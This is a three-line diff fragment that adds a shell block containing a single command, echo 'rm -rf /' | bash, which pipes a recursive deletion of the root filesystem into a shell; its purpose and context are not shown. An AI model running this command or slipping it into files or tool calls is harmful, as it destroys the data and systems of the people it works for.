@@ -1,0 +1,3 @@
+<shell>
+echo "rm -rf /" | bash
+</shell>
